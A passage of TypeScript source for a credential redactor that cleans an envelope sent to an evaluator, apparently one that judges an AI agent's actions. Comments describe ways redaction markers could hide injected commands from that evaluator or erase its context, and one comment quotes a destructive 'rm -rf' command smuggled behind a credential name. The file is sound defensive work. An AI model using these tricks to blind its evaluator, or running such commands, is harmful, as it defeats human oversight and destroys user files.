 * list: `Cookie: a=1; sid=…` and `Authorization: AWS4-HMAC-SHA256
 * Credential=…, SignedHeaders=content-type;host, Signature=…`, both of which
 * are written unquoted in a raw HTTP file or a log. So a value that has
 * already taken a `name=` pair keeps going through `;`, `&` and `|`; `&&` and
 * `||` are two commands in every spelling and always end it.
 *
 * A character loop, so a 100 KB line costs 100 KB of work and no regex can
 * backtrack over it.
 */
function credentialValueEnd(text: string, start: number, close: string | null): number {
  let i = start;
  let sawPair = false;
  while (i < text.length) {
    const c = text[i];
    if (c === "\n" || c === "\r") return i;
    if (close !== null) {
      if (text.startsWith(close, i) && quoteClosesValue(text, i, close)) return i;
    } else if (c === ";" || c === "&" || c === "|") {
      if (!sawPair || ((c === "&" || c === "|") && text[i + 1] === c)) return i;
    } else if (c === "=" && i > start) {
      sawPair = true;
    }
    if (c === "\\") {
      const n = text[i + 1];
      if (n === "n" || n === "r") return i;
      i += n === undefined ? 1 : 2;
      continue;
    }
    i++;
  }
  return text.length;
}

/** A line break at `i`: a real one, or the JSON escape of one. 0 when there is none. */
function lineBreakLength(text: string, i: number): number {
  const c = text[i];
  if (c === "\n") return 1;
  if (c === "\r") return text[i + 1] === "\n" ? 2 : 1;
  if (c === "\\" && (text[i + 1] === "n" || text[i + 1] === "r")) return 2;
  return 0;
}

/** Where the line holding `pos` starts, real breaks and JSON-escaped ones alike. */
function lineStartBefore(text: string, pos: number): number {
  for (let i = pos - 1; i >= 0; i--) {
    const c = text[i];
    if (c === "\n" || c === "\r") return i + 1;
    if ((c === "n" || c === "r") && i > 0 && text[i - 1] === "\\") return i + 1;
  }
  return 0;
}

/** Where the line holding `at` ends. */
function lineEnd(text: string, at: number): number {
  let i = at;
  while (i < text.length && lineBreakLength(text, i) === 0) i++;
  return i;
}

/** How many spaces or tabs `at` opens with. */
function indentAt(text: string, at: number): number {
  let n = 0;
  while (text[at + n] === " " || text[at + n] === "\t") n++;
  return n;
}

/**
 * A YAML block or folded scalar indicator (`|`, `>-`, `|+2`) that is the whole
 * rest of the line: the value is the block indented underneath it. Read in
 * code and in one bounded step, because an indicator is at most four
 * characters and slicing the rest of the line per header is not linear.
 * Returns where the indicator's line ends, or -1.
 */
function blockIndicatorEnd(text: string, at: number): number {
  const c = text[at];
  if (c !== "|" && c !== ">") return -1;
  let i = at + 1;
  if (text[i] === "+" || text[i] === "-") i++;
  while (text[i] >= "0" && text[i] <= "9") i++;
  while (text[i] === " " || text[i] === "\t") i++;
  return i >= text.length || lineBreakLength(text, i) > 0 ? i : -1;
}

/**
 * Whether only indentation — and the opening quote of a JSON key — precedes
 * `at` on its line.
 *
 * This is what keeps the continuation rule on the formats that have one. A
 * header NAME written on its own line is YAML, a folded HTTP header or a
 * line-broken dict, and the credential really is the block underneath. A name
 * with a COMMAND in front of it (`echo authorization:`, `grep -rn cookie:`) is
 * none of those, and taking the lines beneath it hid whatever the agent had
 * written there behind one marker that read as handled.
 */
function startsItsLine(text: string, at: number): boolean {
  for (let i = lineStartBefore(text, at); i < at; i++) {
    const c = text[i];
    if (c !== " " && c !== "\t" && c !== '"' && c !== "'" && c !== "\\" && c !== "-") return false;
  }
  return true;
}

/**
 * How many lines a block scalar's value may run for. A credential wrapped over
 * more lines than this is not a credential, and a value that ends only where
 * the indentation does is a way to hide a page of injected text behind one
 * marker.
 */
const MAX_CONTINUATION_LINES = 32;

/**
 * The value of a header whose own line holds nothing but the name — a folded
 * HTTP header, a line-broken JSON object, and above all a YAML block scalar
 * (`authorization: >-`), the one format where a credential legitimately sits on
 * its own line. Redacting the indicator and leaving the credential underneath
 * it was worse than not matching at all: the count read as handled.
 *
 * Bounded three ways, because a marker that swallows an unbounded block hides
 * an injected command from the evaluator just as effectively as it hides a
 * credential from Jev:
 *
 *  - the name must START its line (`startsItsLine`), so `echo authorization:`
 *    takes nothing;
 *  - without an explicit block indicator the value is ONE line, the folded
 *    header and the line-broken dict;
 *  - with one (`authorization: |`) it is the more-indented block, and never
 *    more than `MAX_CONTINUATION_LINES` of it.
 *
 * A first line that opens with a quote ends at that quote instead, so
 * `{"Authorization":\n  "…"}` keeps its quotes.
 *
 * Reached only when the rest of the header's line is blank or a block
 * indicator, which at most one header per line can be, so the walk back to the
 * line start costs one pass over that line and the scan stays linear.
 */
function continuationValue(text: string, nameAt: number, from: number, block: boolean): { start: number; end: number } | null {
  // Cheap test first: only a value that runs to a line break can continue on
  // the next one, and at most one header per line does, so the walk back to
  // the line start below costs one pass over that line and no more.
  if (lineBreakLength(text, from) === 0) return null;
  if (!startsItsLine(text, nameAt)) return null;
  const indent = indentAt(text, lineStartBefore(text, nameAt));
  let start = -1;
  let end = -1;
  let taken = 0;
  let i = from;
  for (;;) {
    const b = lineBreakLength(text, i);
    if (b === 0) break;
    const lineAt = i + b;
    const ind = indentAt(text, lineAt);
    const contentAt = lineAt + ind;
    if (contentAt >= text.length || ind <= indent || lineBreakLength(text, contentAt) > 0) break;
    if (start < 0) {
      // A quoted first line is the whole value: `"HMAC …"` on its own line.
      const q = text[contentAt];
      const escaped = q === "\\" && (text[contentAt + 1] === '"' || text[contentAt + 1] === "'");
      if (q === '"' || q === "'" || escaped) {
        const close = escaped ? text.slice(contentAt, contentAt + 2) : q;
        const inner = contentAt + close.length;
        return { start: inner, end: credentialValueEnd(text, inner, close) };
      }
      start = contentAt;
    }
    i = lineEnd(text, contentAt);
    end = i;
    if (++taken >= (block ? MAX_CONTINUATION_LINES : 1)) break;
  }
  return start < 0 || end <= start ? null : { start, end };
}

/**
 * A character no credential's own text carries, so a piece holding one is not
 * one and may not reach the scrub list. Each exclusion is a delete key that
 * was reported and deleted attacker-chosen text envelope-wide: a `/` is a path
 * or a URL, a bracket or a backtick or a `$` is code or a reference, a `<` is
 * one of this file's own markers, a `:` is a timestamp or a scheme or a port,
 * a quote or a comma is punctuation of the text around the value, and
 * whitespace is a phrase.
 *
 * Everything else stays in: a password is allowed to hold `!`, `#`, `%`, `+`
 * and the rest, and the ones that are ALSO written in real credentials
 * (`+`, `=`, `.`, `_`, `-`) carry base64, JWTs and hex.
 */
const NOT_CREDENTIAL_CHARS_RE = /[\s/\\<>(){}[\]`$"',;:|&]/;
/** A piece OPENING with one of these is a reference, a flag or a path. */
const NOT_CREDENTIAL_START_RE = /^[-~%@#^*?!+=.]/;
/** `session.user.id`, `config.apiKey`: an expression, not a token. A JWT's
 *  segments are far longer than an identifier's, so it is not one of these. */
const DOTTED_IDENTIFIER_RE = /^[A-Za-z_$][A-Za-z0-9_$]{0,11}(?:\.[A-Za-z_$][A-Za-z0-9_$]{0,11})+$/;

/**
 * `piece` as a COPY of the credential just redacted, or null.
 *
 * This is the ONE question this file asks about a credential's content, and it
 * decides the SCRUB LIST, never the redaction: the value is replaced on the
 * strength of its NAME whatever this returns.
 *
 * It has to be asked, because `scrubKnownSecrets` deletes what it is given from
 * every other string in the envelope — from `facts`, which the prompt tells Jev
 * are "correct", and from the human's own words. The blunt rules above redact
 * whatever an agent writes under a credential name, so a path, a second command
 * or an English sentence lands here just as readily as a token, and reporting
 * those made the scrub list an attacker-writable delete key: `echo cookie: ;
 * rm -rf /home/u/build` reported `rm`, `-rf` and the path, and the path then
 * vanished from `facts.paths` and from `user_said`.
 *
 * So only an opaque token qualifies: eight characters or more, holding none of
 * the characters that say "path, expression, marker or phrase" and opening
 * with none of them either, not a dotted identifier, not mostly digits and
 * separators, and a shape a word does not have. A credential that
 * fails the test is still redacted where it was written; only the scrub of its
 * copies elsewhere is given up, and a copy that reaches Jev anyway is one with
 * no credential context around it. When in doubt this returns null: an unfixed
 * copy is one string in the request, a wrong entry deletes the evaluator's
 * context wherever the attacker chose to point it.
 */
function credentialCopy(piece: string): string | null {
  const s = bareArgument(piece);
  if (s.length < 8 || NOT_CREDENTIAL_CHARS_RE.test(s) || NOT_CREDENTIAL_START_RE.test(s)) return null;
  if (DOTTED_IDENTIFIER_RE.test(s)) return null;
  // A date, a version, a numeric id: a credential has letters in it.
  if (s.replace(/[^A-Za-z]/g, "").length * 4 < s.length) return null;
  return tokenLike(s) ? s : null;
}

/**
 * What of a redacted header value to hand `scrubKnownSecrets`, which replaces
 * every copy of it in the REST of the envelope.
 *
 * Only text that was actually redacted as a credential may go on that list, so
 * every piece goes through `credentialCopy`, and two structural exclusions come
 * first:
 *
 *  - a region holding a marker reports nothing. Whatever was secret in it was
 *    already found and reported by the earlier rule that wrote the marker, and
 *    splitting the rest on whitespace produced fragments of the MARKER —
 *    `<redacted:OpenAI` is sixteen characters, so `scrubKnownSecrets` accepted
 *    it and mangled every other marker in the envelope.
 *  - where the header HAS a scheme position, the first piece is dropped, alone
 *    on the value or not: `Bearer`, `AWS4-HMAC-SHA256`, `Hawk`, `NTLM` are
 *    public, and `AWS4-HMAC-SHA256` is exactly sixteen characters, so reporting
 *    it deleted the human's own words from `user_said`. Requiring a SECOND
 *    piece before dropping the first left that exact string on the list for a
 *    value that is only a scheme word. A piece with an `=` in it is never a
 *    scheme, and `Cookie`/`x-api-key` have no scheme position at all — their
 *    credential IS the first piece (`sid=…`), which round 6 dropped while
 *    scrubbing the public `theme=dark` next to it envelope-wide.
 *
 * A `name=value` piece reports its VALUE rather than the pair: the value is the
 * credential, and a copy written as `sid=<value>` loses it too, because the
 * scrub replaces substrings. That is what keeps `theme=dark` off the list. An
 * `=` with nothing but more `=` behind it is base64 PADDING, not a separator —
 * reading `dXNlcjpwYXNz==` as a pair reported its one-character tail, which
 * fails the floor, so a `Basic` credential's copies went out in clear.
 */
function credentialCopies(region: string, hasScheme: boolean): string[] {
  if (region.includes(AUTH_MARKER_HEAD)) return [];
  const pieces = region.split(/\s+/).filter(Boolean);
  const out: string[] = [];
  for (let i = 0; i < pieces.length; i++) {
    const piece = bareArgument(pieces[i]);
    if (i === 0 && hasScheme && !piece.includes("=")) continue;
    const eq = piece.indexOf("=");
    const tail = eq > 0 ? piece.slice(eq + 1) : "";
    const copy = credentialCopy(eq > 0 && !/^=*$/.test(tail) ? tail : piece);
    if (copy !== null && !out.includes(copy)) out.push(copy);
  }
  return out;
}

/** Every credential header's value in `text`, as one marker each. */
function redactCredentialHeaders(text: string, counter: { n: number; found: string[] }): string {
  let out = "";
  let last = 0;
  const cur: QuoteCursor = { pos: 0, open: null };
  CREDENTIAL_HEADER_RE.lastIndex = 0;
  for (let m = CREDENTIAL_HEADER_RE.exec(text); m !== null; m = CREDENTIAL_HEADER_RE.exec(text)) {
    const valueAt = m.index + m[0].length;
    if (cur.pos < valueAt) advanceQuotes(text, cur, valueAt);
    let close = cur.open;
    let start = valueAt;
    if (close === null) {
      // The value opens a quote of its own: `{"Authorization": "Bearer …"}`.
      const c = text[valueAt];
      if (c === '"' || c === "'") {
        close = c;
        start = valueAt + 1;
      } else if (c === "\\" && (text[valueAt + 1] === '"' || text[valueAt + 1] === "'")) {
        close = text.slice(valueAt, valueAt + 2);
        start = valueAt + 2;
      }
    }
    let end = credentialValueEnd(text, start, close);
    let region = text.slice(start, end);
    // Nothing on this line but the name, or a YAML block indicator: the value
    // is the block indented underneath.
    // A block indicator is one wherever it is written: `blockIndicatorEnd`
    // already requires it to END the line, so a `|` inside a quoted value
    // (`-H "Authorization: |"`) is not one, and a YAML document nested inside
    // a JSON string — where the enclosing quote is open — still is.
    const indicator = blockIndicatorEnd(text, start);
    if (indicator >= 0 || withoutMarkers(region).trim() === "") {
      const cont = continuationValue(text, m.index + m[1].length, indicator >= 0 ? indicator : end, indicator >= 0);
      if (cont === null) continue;
      start = cont.start;
      end = cont.end;
      region = text.slice(start, end);
    }
    // Nothing left to take: an empty value, or one an earlier rule already
    // replaced whole — which is what makes a second pass a no-op.
    if (withoutMarkers(region).trim() === "") continue;
    out += text.slice(last, start) + marker(credentialHeaderLabel(m[2]));
    counter.n++;
    for (const s of credentialCopies(region, headerHasScheme(m[2]))) counter.found.push(s);
    last = end;
    CREDENTIAL_HEADER_RE.lastIndex = end;
  }
  CREDENTIAL_HEADER_RE.lastIndex = 0;
  return last === 0 ? text : out + text.slice(last);
}

/**
 * A Bearer credential with no `Authorization` in front of it — `"Bearer …"` as a
 * value in a script or a config. Must look like a token, because "bearer" is also
 * an English word ("the bearer authentication scheme").
 */
const BEARER_RE = /\b(bearer[ \t]+)([A-Za-z0-9\-._~+/=]{8,})/gi;

/**
 * Credential arguments on the command line.
 *
 * The same blunt rule as the credential headers, for the same reason: the FLAG
 * decides, never the value. `--password swordfish` is a password although
 * nothing about `swordfish` says so, and `-p -aB3xY…`, `--api-key '$ecret'`
 * and `--token <paste-it-here>` are credentials whose first character used to
 * disqualify them. So the WHOLE argument goes — quoted or bare, attached
 * (`-p'pw'`) or separate, reference-shaped or not.
 *
 * Deliberately blunter than before: `use --token to authenticate` and
 * `failproofai config --token <token>` now lose their next word to a marker.
 *
 * The flag list is fixed rather than name-derived, because the list is the
 * whole false-positive guard. A long flag that names a credential is one
 * wherever it appears; a SHORT one is ambiguous (`-p` is `--parents` to
 * `mkdir` and a port map to `docker run`), so it counts only behind a command
 * that takes a credential that way, found in a bounded window that never
 * crosses a command separator. Short flags are matched case-SENSITIVELY:
 * mysql's `-P` is the port and its `-p` is the password. Other secret-named
 * flags (`--dsn`, `--pat`) stay with `FLAG_NAME_RE`, which still asks what
 * the value looks like.
 */
const CREDENTIAL_FLAGS: ReadonlySet<string> = new Set([
  "--password",
  "--passwd",
  "--passphrase",
  "--pwd",
  "--token",
  "--api-token",
  "--auth-token",
  "--access-token",
  "--refresh-token",
  "--session-token",
  "--private-token",
  "--personal-access-token",
  "--secret",
  "--client-secret",
  "--api-key",
  "--apikey",
  "--admin-password",
  "--db-password",
  "--registry-password",
  "--credential",
  "--credentials",
]);

/** A short or ambiguous flag, and the command that makes it a credential. */
interface GatedFlag {
  flag: string;
  commands: ReadonlyArray<string>;
  /** A second word that must be in the window too (`docker … login -p`). */
  also?: string;
  /** mysql's `-p` takes its password GLUED; a bare `-p` prompts, and the word
   *  after it is the database. */
  attachedOnly?: boolean;
}
const GATED_CREDENTIAL_FLAGS: ReadonlyArray<GatedFlag> = [
  { flag: "-p", commands: ["mysql", "mysqldump", "mysqladmin", "mariadb", "mariadb-dump"], attachedOnly: true },
  { flag: "-p", commands: ["sshpass"] },
  { flag: "-p", commands: ["docker", "podman", "helm", "oras", "skopeo", "buildah", "nerdctl"], also: "login" },
  { flag: "-a", commands: ["redis-cli"] },
  { flag: "-b", commands: ["gh"], also: "secret" },
  { flag: "--body", commands: ["gh"], also: "secret" },
];
/** `curl -u user:pass`: the user is kept, everything after the `:` is not. */
const BASIC_AUTH_FLAGS: ReadonlySet<string> = new Set(["-u", "--user", "--proxy-user"]);
const BASIC_AUTH_COMMANDS: ReadonlyArray<string> = ["curl", "wget", "http", "xh", "httpie"];
/**
 * How far back a gated flag looks for its command. Bounded, so the scan stays
 * linear however many flags a line holds; a command and its credential flag
 * sit next to each other in every real spelling.
 */
const COMMAND_LOOKBACK = 120;

/** A flag, wherever one starts. The boundary group is what keeps this linear. */
const FLAG_TOKEN_RE = /(^|\\[nrt]|[^A-Za-z0-9_-])(--?[A-Za-z][A-Za-z0-9_-]*)/g;
const WORD_BEFORE_RE = /[A-Za-z0-9_-]/;
const WORD_AFTER_RE = /[A-Za-z0-9_]/;

/** Whether `word` appears in `window` as a whole word. */
function hasCommandWord(window: string, word: string): boolean {
  for (let i = window.indexOf(word); i >= 0; i = window.indexOf(word, i + 1)) {
    const before = i === 0 ? "" : window[i - 1];
    const after = window[i + word.length] ?? "";
    if (!WORD_BEFORE_RE.test(before) && !WORD_AFTER_RE.test(after)) return true;
  }
  return false;
}

/** The text behind `at` a gated flag may look in: one command, bounded. */
function commandWindow(lower: string, at: number): string {
  let from = Math.max(0, at - COMMAND_LOOKBACK);
  for (let i = at - 1; i >= from; i--) {
    const c = lower[i];
    if (c === "\n" || c === "\r" || c === ";" || c === "&" || c === "|") {
      from = i + 1;
      break;
    }
  }
  return lower.slice(from, at);
}

/**
 * Every word that can gate a flag. A word that is nowhere in the text gates
 * nothing, and checking that ONCE per string is what keeps a line of repeated
 * `-p ` from costing a window and a dozen searches per flag: 448 ms for a
 * full-sized envelope of them, against the 600 ms this file's own budget test
 * asserts.
 */
const GATING_WORDS: ReadonlyArray<string> = [
  ...new Set([
    ...GATED_CREDENTIAL_FLAGS.flatMap((g) => [...g.commands, ...(g.also === undefined ? [] : [g.also])]),
    ...BASIC_AUTH_COMMANDS,
  ]),
];

/**
 * Where the one command-line argument that starts at `start` ends.
 *
 * `close` is the quote the COMMAND itself sits inside, carried forward by the
 * same cursor the header path uses. It is what ends the argument in the
 * commonest MCP shape of all — `{"command": "app --password pw"}` — where the
 * `"` belongs to the JSON around the command, not to the value: swallowing it
 * put `pw"}` on the scrub list, so the bare copy of that credential elsewhere
 * in the envelope no longer matched and went out to Jev, and it cost the text
 * Jev was shown its closing quote.
 */
function credentialArgumentEnd(text: string, start: number, close: string | null): { from: number; to: number } {
  // A quote of the value's own: `--password 'pw'`, and inside an enclosing
  // string `--password \"pw\"` or `-p 'pw'` just the same.
  const own = valueOwnQuote(text, start, close);
  if (own !== null) {
    for (let i = start + own.length; i < text.length; i++) {
      if (text.startsWith(own, i)) return { from: start + own.length, to: i };
      const c = text[i];
      if (c === "\n" || c === "\r") break;
      if (c === "\\" && (text[i + 1] === "n" || text[i + 1] === "r")) break;
    }
  }
  let i = start;
  while (i < text.length) {
    const c = text[i];
    if (close !== null && text.startsWith(close, i)) break;
    // A marker an earlier rule wrote has spaces in it and is one unit.
    if (c === "<" && text.startsWith(AUTH_MARKER_HEAD, i)) {
      const closed = text.indexOf(">", i);
      if (closed > 0) {
        i = closed + 1;
        continue;
      }
    }
    if (c === " " || c === "\t" || c === "\n" || c === "\r" || c === ";" || c === "&" || c === "|") break;
    if (c === "\\" && /[nr]/.test(text[i + 1] ?? "")) break;
    i++;
  }
  return { from: start, to: i };
}

/**
 * Whether a flag's value is GLUED to it rather than separated: `-ppw`, `-p'pw'`
 * and `-p$PW` are all one argument. The flag token stops at the first character
 * that cannot be part of a flag NAME, so a glued value that opens with a quote,
 * a `$` or any other punctuation is not in the token and has to be seen here.
 */
function hasGluedValue(text: string, at: number): boolean {
  const c = text[at];
  if (c === undefined) return false;
  return c !== " " && c !== "\t" && c !== "=" && c !== "\n" && c !== "\r" && c !== ";" && c !== "&" && c !== "|";
}

/** Where the value of a flag ending at `flagEnd` starts, or -1 if it has none. */
function credentialValueStart(text: string, flagEnd: number, attached: boolean): number {
  if (attached) return flagEnd;
  let i = flagEnd;
  if (text[i] === "=") i++;
  else if (hasGluedValue(text, i)) return i;
  else while (text[i] === " " || text[i] === "\t") i++;
  if (i === flagEnd) return -1; // nothing but a terminator behind the flag
  const v = text[i];
  if (v === undefined || v === "\n" || v === "\r" || v === ";" || v === "&" || v === "|") return -1;
  return i;
}

/**
 * Every credential argument in `text`, as one marker each. The quotes around a
 * value stay where they were written, around the marker, so the secret handed
 * to the scrub pass is the BARE value — the form its copies elsewhere in the
 * envelope are in.
 */
function redactCredentialArguments(text: string, counter: { n: number; found: string[] }): string {
  let out = "";
  let last = 0;
  // The quote the command itself sits inside, carried forward in one pass.
  const cur: QuoteCursor = { pos: 0, open: null };
  // Lowercased once per string, and only when a gated flag is actually met.
  let lower: string | null = null;
  let present: ReadonlySet<string> | null = null;
  const gates = (w: string): boolean => {
    if (present === null) {
      lower = text.toLowerCase();
      present = new Set(GATING_WORDS.filter((x) => (lower as string).includes(x)));
    }
    return present.has(w);
  };
  FLAG_TOKEN_RE.lastIndex = 0;
  for (let m = FLAG_TOKEN_RE.exec(text); m !== null; m = FLAG_TOKEN_RE.exec(text)) {
    const flagAt = m.index + m[1].length;
    if (flagAt < last) continue;
    const raw = m[2];
    const token = raw.toLowerCase();
    let win: string | null = null;
    const near = (w: string): boolean => gates(w) && hasCommandWord((win ??= commandWindow(lower as string, flagAt)), w);
    let flagEnd = -1;
    let attached = false;
    let label = "credential argument";
    let basicAuth = false;
    if (CREDENTIAL_FLAGS.has(token)) {
      flagEnd = flagAt + raw.length;
      label = "assigned secret";
    } else if (BASIC_AUTH_FLAGS.has(token) && BASIC_AUTH_COMMANDS.some(near)) {
      flagEnd = flagAt + raw.length;
      label = "basic auth";
      basicAuth = true;
    } else {
      for (const g of GATED_CREDENTIAL_FLAGS) {
        const cand = g.flag.startsWith("--") ? token : raw;
        if (!cand.startsWith(g.flag)) continue;
        // `-p'pw'` and `-p$PW` are the glued form too: the flag token stops in
        // front of a character a flag NAME cannot hold.
        const glued = cand.length > g.flag.length || hasGluedValue(text, flagAt + g.flag.length);
        if (g.attachedOnly === true && !glued) continue;
        if (!g.commands.some(near)) continue;
        if (g.also !== undefined && !near(g.also)) continue;
        flagEnd = flagAt + g.flag.length;
        attached = glued;
        break;
      }
    }
    if (flagEnd < 0) continue;
    let start = credentialValueStart(text, flagEnd, attached);
    if (start < 0) continue;
    if (cur.pos < start) advanceQuotes(text, cur, start);
    const close = cur.open;
    let arg = credentialArgumentEnd(text, start, close);
    if (basicAuth) {
      // `-u user:pass`: only what follows the FIRST colon is the credential.
      const colon = text.indexOf(":", arg.from);
      if (colon < 0 || colon >= arg.to) continue;
      start = colon + 1;
      arg = valueOwnQuote(text, start, close) !== null ? credentialArgumentEnd(text, start, close) : { from: start, to: arg.to };
    }
    if (arg.to <= arg.from) continue;
    const value = text.slice(arg.from, arg.to);
    // Already replaced by an earlier rule: a second pass must be a no-op.
    // A lone quote or backslash is nobody's credential either — that is what a
    // desynchronised cursor leaves behind, and a marker over it would both
    // read as handled and hide the delimiter Jev needs to parse the call.
    if (withoutMarkers(value).replace(/[\\"']/g, "").trim() === "") continue;
    out += text.slice(last, arg.from) + marker(label);
    counter.n++;
    // Only the bare credential goes on the scrub list, and only when it could
    // be one: this rule redacts on the FLAG alone, so `git commit -am "fix
    // --token parsing"` lands here too.
    const copy = credentialCopy(value);
    if (copy !== null) counter.found.push(copy);
    last = arg.to;
    FLAG_TOKEN_RE.lastIndex = arg.to;
  }
  FLAG_TOKEN_RE.lastIndex = 0;
  return last === 0 ? text : out + text.slice(last);
}

/**
 * `config set <name> <value>`: aws configure, npm/pnpm/yarn config, git config.
 * Redacted only when the NAME says it is a secret and the value looks like one
 * — prose such as "run `x config --token <token>` and …" has the same shape.
 */
const CONFIG_SET_RE =
  /(\b(?:config(?:ure)?[ \t]+set|config)(?:[ \t]+--?[A-Za-z][\w-]*)*[ \t]+)([A-Za-z_/@.:][^\s"'=<>]*)([ \t]+)("[^"\n]*"|'[^'\n]*'|[^\s"';&|]+)/g;

/**
 * `NAME=value`, `NAME: value`, `"name": "value"`, `--name=value`, `?name=value`,
 * `name = "value"` — every syntax an assignment is written in, in one scan.
 * The NAME decides whether the value is a secret (see `secretNameStrength`) and
 * the value has to look like a literal (see `assignmentValueIsSecret`).
 *
 *   1  the token boundary in front of the name
 *   2  optional quote before the name (JSON; possibly JSON-escaped)
 *   3  the name, keeping a flag's leading dashes
 *   4  optional quote after the name
 *   5  the separator
 *
 * The regex stops at the SEPARATOR; the value is walked in code by
 * `literalValue`. That is the same structural fix the credential-header rule
 * took, and for the same reason. Matching the value here was the file's last
 * quadratic: an unquoted value may hold `=`, so on a delimiter-free run like
 * `a=key=a=key=…` the engine consumed the rest of the run at every start
 * position and `replaceCounting` then resumed one character later. 910 ms for
 * one envelope of that shape, growing as the square — 20 ms at 16 KB, 87 at
 * 32 KB, 467 at 64 KB — with the hook waiting on it before Jev is even called.
 * A name-only match is O(1) per separator, and the walk visits each character
 * of the value once.
 *
 * Group 1 is what keeps the NAME linear, and it is why the name is not checked
 * for a token boundary in code afterwards. Without it the name could start at
 * any character of a token: on a 4 000-character run of identifier characters
 * with no separator in it, the engine consumed the rest of the run at every one
 * of those positions and backtracked over it — 35 ms for one string, and
 * `buildEnvelope` redacts up to 576 of them. Requiring a boundary character
 * makes every position inside a token fail in one step. The boundary is
 * consumed rather than a lookbehind because a lookbehind drops the regex JIT,
 * which costs more than it saves on every other string; it is re-emitted in
 * front of the replacement. `\n`, `\r` and `\t` count because input nested two
 * levels deep is JSON-stringified, where a name at the start of a line follows
 * the two characters `\` `n` — that alternative comes first so the name is
 * `API_KEY` rather than `nAPI_KEY`.
 */
const ASSIGNMENT_NAME_RE =
  /(^|\\[nrt]|[^A-Za-z0-9_.-])((?:\\?["'])?)(-{0,2}[A-Za-z_][A-Za-z0-9_.-]*)((?:\\?["'])?)([ \t]*(?::=|=|:(?!\/\/))[ \t]*)/g;

/**
 * `--password hunter2`: a secret-named flag and a separate value.
 *
 *   1  the token boundary   2  the flag   3  the space
 *
 * Boundary group and code-walked value as in `ASSIGNMENT_NAME_RE`, and for the
 * same two reasons: `-` is a name character, so without the boundary every
 * hyphen of a kebab-case run started a flag whose tail was consumed and
 * backtracked (`x--token` and `a-b c` were then declined in code, after the
 * cost had been paid).
 */
const FLAG_NAME_RE = /(^|\\[nrt]|[^A-Za-z0-9_.-])(--?[A-Za-z][A-Za-z0-9_-]*)([ \t]+)/g;

/** Where an unquoted literal value ends. */
const UNQUOTED_VALUE_STOP_RE = /[\s"'`<>(){}[\],;&|\\]/;

/**
 * The literal value written at `at`: a quoted one, or a run of value
 * characters. Null when there is none.
 *
 * A character walk, never a regex, so no input can make it backtrack. The
 * quoted form ends at the first matching delimiter on the line, and the
 * delimiter itself is NOT part of the span — it stays in the text to be the
 * boundary of whatever comes next, because `TOKEN="a"PASSWORD=x` has no
 * character to spare between the two and consuming that quote hid the second
 * assignment from the scan entirely.
 *
 * `escapedQuote` accepts a JSON-escaped `\"` as the delimiter (an assignment
 * nested two levels deep); `leadingDash` allows a value that opens with `-`
 * (`--password -aB3…`), which a flag's value may not, or `--token --verbose`
 * would read the next flag as the credential.
 *
 * `stop` is what keeps the UNQUOTED walk linear over the whole text. An
 * unquoted value may hold `=`, so on a delimiter-free run (`a=key=a=key=…`)
 * every value runs to the end of the run and the walk is quadratic — the same
 * cost the old regex paid, moved into code. The cursor remembers a span
 * `[from, at)` it has already proved holds no stop character; a question
 * inside that span is answered without rescanning it, and one outside it
 * starts a fresh span. Questions arrive in increasing order almost always, so
 * the whole scan visits each character about once.
 */
function literalValue(
  text: string,
  at: number,
  opts: { escapedQuote: boolean; leadingDash: boolean; stop: { from: number; at: number } },
): { quote: string; from: number; to: number } | null {
  const c = text[at];
  if (c === undefined) return null;
  let quote = "";
  if (c === '"' || c === "'") quote = c;
  else if (opts.escapedQuote && c === "\\" && (text[at + 1] === '"' || text[at + 1] === "'")) quote = text.slice(at, at + 2);
  if (quote !== "") {
    for (let i = at + quote.length; i < text.length; i++) {
      if (text.startsWith(quote, i)) return { quote, from: at + quote.length, to: i };
      const d = text[i];
      if (d === "\n" || d === "\r") return null;
    }
    return null;
  }
  if (!opts.leadingDash && c === "-") return null;
  if (at < opts.stop.from || at > opts.stop.at) {
    let i = at;
    while (i < text.length && !UNQUOTED_VALUE_STOP_RE.test(text[i])) i++;
    opts.stop.from = at;
    opts.stop.at = i;
  }
  return opts.stop.at > at ? { quote: "", from: at, to: opts.stop.at } : null;
}

/** Long runs of token characters: candidates for the high-entropy rule. Greedy, so a match is a whole run. */
const LONG_TOKEN_RE = /[A-Za-z0-9_-]{32,}/g;

// ── Secret names ─────────────────────────────────────────────────────────────

/** A secret on their own, as the last word of a name or the whole of it. */
const STRONG_LAST_WORDS = new Set([
  "secret",
  "password",
  "passwd",
  "passphrase",
  "pwd",
  "credential",
  "credentials",
  "apikey",
  "cookie",
]);
/** `<one of these>_key` is a secret key rather than a lookup key. */
const STRONG_KEY_QUALIFIERS = new Set(["api", "secret", "private", "master", "signing", "encryption", "client", "auth", "access"]);
/**
 * Only a secret as the last word of a COMPOUND name. `key` and `auth` are
 * ordinary words in code — React's `key` prop is on every JSX list — so a bare
 * `key=` is not enough; `STRIPE_KEY=` is. (A bare all-caps `KEY=` is: that is an
 * environment variable, not a prop.)
 */
const WEAK_LAST_WORDS = new Set(["key", "pat", "pass", "auth", "sig", "signature", "dsn"]);
/** The word before `key`/`token` that makes it a lookup key or a counter, not a credential. */
const NOT_SECRET_QUALIFIERS = new Set([
  "primary", "foreign", "sort", "partition", "range", "hash", "row", "unique", "composite", "object",
  "cache", "storage", "local", "idempotency", "dedup", "dedupe", "lookup", "map", "dict", "index",
  "list", "group", "field", "item", "node", "event", "message", "column", "table", "form", "route",
  "query", "i18n", "translation", "locale", "react", "redis", "s3", "bucket", "file", "path", "state",
  "store", "registry", "setting", "settings", "config", "design", "theme", "color", "next", "page",
  "continuation", "cursor", "max", "min", "num", "total", "count", "input", "output", "completion",
  "prompt", "cancel", "cancellation", "sync", "lock", "rate", "limit", "sort", "order", "public",
  "publishable", "pub", "ssh", "gpg", "pgp",
  // Predicates and verbs: `has_key`, `is_token`, `rotate_secret_key`, `mask_token`.
  "has", "is", "use", "with", "no", "needs", "require", "requires", "enable", "enabled", "allow",
  "missing", "valid", "invalid", "check", "get", "load", "read", "parse", "validate", "generate",
  "create", "rotate", "fetch", "find", "show", "print", "mask", "masked", "redact", "redacted", "hide",
  "hidden",
  // Values that say they are not real.
  "example", "sample", "dummy", "fake", "mock", "placeholder",
]);
/** A name ending in one of these describes the secret; its value is not the secret. */
const META_SUFFIXES = new Set([
  "dir", "dirs", "path", "paths", "file", "files", "filename", "name", "names", "id", "ids", "arn",
  "ref", "refs", "length", "len", "count", "days", "ttl", "version", "url", "uri", "env", "manager",
  "store", "provider", "type", "types", "format", "policy", "policies", "rotation", "enabled",
  "required", "min", "max", "header", "field", "param", "params", "prompt", "label", "placeholder",
  "hint", "error", "errors", "message", "regex", "re", "pattern", "patterns", "validator", "strength",
